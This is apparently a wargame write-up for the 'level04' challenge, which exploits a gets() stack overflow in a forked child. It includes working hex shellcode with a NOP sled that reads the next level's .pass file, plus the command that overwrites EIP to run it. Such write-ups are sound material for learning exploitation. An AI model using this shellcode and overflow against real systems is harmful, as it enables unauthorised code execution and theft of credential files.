# level04

This program forks itself:
- The child calls `gets` on a stack buffer (so obvious buffer overflow attack vector)
- Meanwhile the parent watches the child and kills it as soon as a syscall is detected

The obvious shellcode to create a reverse shell won't work here, but there are still possibilities.
We created a shellcode that opens, reads, and outputs the .pass file.

The shellcode uses a [JMP CALL POP technique](https://marcosvalle.github.io/osce/2018/05/06/JMP-CALL-POP-technique.html).
It is fully commented so don't hesitate to read it!

To convert the assembly code into a valid shellcode we use this command:
```sh
nasm -f elf32 shellcode.asm -o shellcode.o && objcopy -O binary -j .text shellcode.o /proc/self/fd/1 | hexdump -ve '"\\\" 1/1 "x%02X"'
```

Then we can put the shellcode with a nopslide in the env like so:
```sh
export SHELLCODE=$(python -c 'print "\x90"*1000 + "\xEB\x26\x31\xC0\xB0\x05\x5B\x31\xC9\x31\xD2\xCD\x80\xC6\x44\x24\x28\x0A\x89\xC3\xB0\x03\x89\xE1\xB2\x29\xCD\x80\xB0\x04\xB3\x01\x89\xE1\xCD\x80\xB0\x01\xCD\x80\xE8\xD5\xFF\xFF\xFF\x2F\x68\x6F\x6D\x65\x2F\x75\x73\x65\x72\x73\x2F\x6C\x65\x76\x65\x6C\x30\x35\x2F\x2E\x70\x61\x73\x73"')
```

Using a cycle we found out that we need to write 156 bytes to overwrite EIP in so after finding an address in the middle
of the nopslide all we need to do is call `level4` like so:
```sh
python -c 'print "."*156 + "\xff\xff\xd6\xf9"[::-1]' | ./level04
```

And done!
